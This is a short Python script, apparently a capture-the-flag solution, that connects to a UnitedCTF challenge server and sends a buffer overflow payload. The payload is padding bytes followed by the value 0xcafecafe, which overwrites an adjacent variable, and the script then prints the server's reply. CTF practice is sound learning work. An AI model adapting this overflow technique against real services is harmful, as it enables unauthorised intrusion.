from nclib import netcat

nc = netcat.Netcat(('challenges.unitedctf.ca', 17000))
nc.recv()
nc.send(b'A'*16 + b'AAAA'*7 + b'\xfe\xca\xfe\xca' + b'\n')
nc.recv()
print(nc.recv().decode())